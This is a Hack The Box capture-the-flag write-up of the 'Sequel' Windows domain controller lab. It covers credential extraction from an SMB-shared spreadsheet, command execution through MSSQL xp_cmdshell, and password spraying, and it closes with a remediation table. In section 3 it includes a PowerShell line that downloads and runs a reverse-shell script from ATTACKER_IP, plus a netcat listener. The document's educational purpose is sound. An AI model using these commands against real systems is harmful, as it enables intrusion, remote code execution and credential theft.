# Hack The Box: Sequel Write-Up

### MSSQL Exploitation and Lateral Movement via Shared SMB Documents

- **Target IP:** 10.10.11.51
- **Hostname:** dc01.sequel.htb
- **Domain:** SEQUEL.HTB
- **Operating System:** Windows Server (Active Directory Domain Controller)
- **Primary Vector:** SMB Enumeration & Credential Extraction
- **Secondary Vectors:** MSSQL Command Execution, Password Spraying

---

## Executive Summary

The Sequel machine simulates a corporate environment where sensitive credentials are carelessly stored in shared network documents. The attack chain initiates with SMB enumeration to extract plaintext credentials from an Excel spreadsheet. These credentials provide administrative access to an exposed Microsoft SQL Server instance, which is exploited via the `xp_cmdshell` extended stored procedure to achieve initial code execution. From the compromised database service account, internal configuration files are leveraged to uncover additional credentials, facilitating lateral movement to a standard domain user via password reuse and WinRM.

This write-up details the full attack chain, providing technical context for both offensive operators and defensive analysts.

---

## 1. Reconnaissance & Attack Surface Mapping

A comprehensive Nmap scan reveals a Windows Domain Controller with an exposed database service.

```bash
nmap -A -Pn 10.10.11.51
```

**Key Services Identified:**
- **Port 1433:** Microsoft SQL Server 2019
- **Ports 53, 88, 389, 445, 3268:** Full Active Directory stack (DNS, Kerberos, LDAP, SMB)
- **NetBIOS/Domain Name:** SEQUEL

We add the target to our local hosts file to facilitate name resolution during the engagement.

```bash
echo "10.10.11.51 dc01.sequel.htb sequel.htb" | sudo tee -a /etc/hosts
```

---

## 2. SMB Enumeration & Credential Extraction

Using the provided initial low-privilege domain credentials (`rose:KxEPkKe6R8su`), we enumerate accessible SMB shares.

```bash
netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
```

**Discovered Share:**
- `Accounting Department` (Read/Write access)

We connect to the share using `smbclient` and download the available files, which include `accounting_2024.xlsx` and `accounts.xlsx`.

```bash
smbclient "//10.10.11.51/Accounting Department" -U rose%KxEPkKe6R8su
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

### Extracting Plaintext Credentials
Microsoft Excel `.xlsx` files are fundamentally ZIP archives containing XML data. We extract the contents of `accounts.xlsx` to inspect the underlying data structure.

```bash
unzip accounts.xlsx
cat xl/sharedStrings.xml
```

**Extracted Data:**
```xml
<si><t>angela</t></si><si><t>0fwz7Q4mSpurIt99</t></si>
<si><t>oscar</t></si><si><t>86LxLBMgEWaKUnBG</t></si>
<si><t>kevin</t></si><si><t>Md9Wlq1E5bZnVDVo</t></si>
<si><t>sa</t></si><si><t>MSSQLP@ssw0rd!</t></si>
```

> **Critical Finding:** The plaintext password for the Microsoft SQL Server `sa` (System Administrator) account is exposed: `MSSQLP@ssw0rd!`.

---

## 3. MSSQL Remote Code Execution

With the `sa` credentials, we establish a connection to the MSSQL instance using Impacket's `mssqlclient.py`.

```bash
mssqlclient.py 'sa:MSSQLP@ssw0rd!'@10.10.11.51
```

### Enabling xp_cmdshell
By default, the `xp_cmdshell` extended stored procedure is disabled. We enable it to execute operating system commands.

```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Command Execution Verification
We verify our execution context by querying the current user.

```sql
EXEC xp_cmdshell 'whoami';
-- Output: sequel\sql_svc
```

We have achieved command execution under the context of the `sql_svc` service account.

### Establishing a Reverse Shell
To facilitate deeper post-exploitation, we host a PowerShell reverse shell payload on our attack machine and execute it via `xp_cmdshell`.

**Attacker Setup:**
```bash
python3 -m http.server 8000
nc -nlvp 4444
```

**Target Execution:**
```sql
EXEC xp_cmdshell 'powershell -Command "iex (New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8000/shell.ps1'')"';
```

**Result:** We catch a stable reverse shell operating as `sequel\sql_svc`.

---

## 4. Post-Exploitation & Lateral Movement

### Configuration File Discovery
Operating as `sql_svc`, we enumerate the local filesystem for database configuration files. We locate the SQL Server installation configuration at:

```text
C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

Inspecting the file reveals a hardcoded service account password:

```ini
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

### Password Spraying
We hypothesize that this password may be reused by other domain accounts. We perform a targeted password spray against the domain users identified during earlier enumeration (`ryan`, `michael`, `oscar`).

```bash
netexec smb 10.10.11.51 -u ryan michael oscar -p 'WqSZAF6CysDQbGb3' --continue-on-success
```

**Result:** The password is successfully authenticated by the user `ryan`.

---

## 5. User Access via WinRM

With valid credentials for the `ryan` account, we pivot to WinRM to establish an interactive session on the Domain Controller.

```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

Once connected, we navigate to the user's desktop and retrieve the flag.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
30c8e22895273308d00ff8404ffba54f
```

---

## 6. Vulnerability Analysis & Remediation (Blue Team)

| Vulnerability | Impact | Remediation Strategy |
| :--- | :--- | :--- |
| **Credentials in Shared Documents** | Plaintext credential leakage leading to database compromise. | Enforce strict data handling policies; prohibit storing credentials in documents; utilize enterprise password vaults. |
| **MSSQL `sa` Account with Weak Password** | Unauthenticated administrative access to the database engine. | Enforce complex password policies; disable the `sa` account if not strictly required; use Windows Authentication where possible. |
| **Enabled `xp_cmdshell`** | Arbitrary operating system command execution as the SQL service account. | Keep `xp_cmdshell` disabled by default; restrict access via SQL Server roles; monitor for unauthorized configuration changes. |
| **Password Reuse Across Accounts** | Lateral movement from a service account to a standard domain user. | Enforce unique passwords for all accounts; implement Managed Service Accounts (gMSAs) for SQL services; deploy credential guard. |

---

## 7. Key Takeaways

1. **Shared Drives are High-Value Targets:** Network shares often contain sensitive documentation, metadata, and embedded credentials. Always inspect the contents of accessible shares, including the underlying XML structure of Office documents.
2. **Database Services are Critical Infrastructure:** An exposed MSSQL instance with a compromised `sa` account provides a direct path to remote code execution on the underlying host.
3. **Configuration Files Leak Secrets:** Installation and configuration files frequently contain hardcoded passwords or service credentials. These must be rigorously protected and scrubbed post-installation.
4. **Password Reuse Remains Prevalent:** A single compromised password, whether extracted from a document or a configuration file, can facilitate lateral movement across multiple accounts if users reuse credentials.
5. **Defense Requires Cultural Shift:** Technical controls like firewalls and EDR are insufficient if organizational culture permits the storage of plaintext passwords in shared spreadsheets. Security awareness and strict data governance are mandatory.

> "The weakest link is not the protocol—it is the individual who believes a spreadsheet is a secure vault."

**Box Rating:** 4.5/5 — Realistic, educational, and heavily focused on common enterprise misconfigurations and poor credential hygiene.
